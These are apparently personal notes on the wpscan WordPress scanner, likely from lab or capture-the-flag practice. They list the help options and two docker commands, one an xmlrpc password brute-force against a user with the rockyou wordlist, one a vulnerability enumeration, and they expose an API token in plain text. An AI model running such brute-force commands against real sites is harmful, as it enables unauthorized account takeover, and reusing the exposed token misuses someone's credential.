wpscan
#######

API-key: blPXlsXJT94Y9MjEWSktsB72jBbIzaRE1XUCu0746lc

wpscan –hh help

–api-token to use the wpvuln online database

–enumerate to use a specific mod, otherwise all are scanned.

Examples:

**Password brute force** docker run –mount
type=bind,source=/home/jjamieso/Downloads,target=/root,readonly -it –rm
wpscanteam/wpscan  –password-attack xmlrpc -t 20 -U roger -P
/root/rockyou.txt –url http://94.237.62.247:58618

**Enumeration** docker run -it –rm wpscanteam/wpscan  –url
http://94.237.62.154:58093 –enumerate –api-token
blPXlsXJT94Y9MjEWSktsB72jBbIzaRE1XUCu0746l
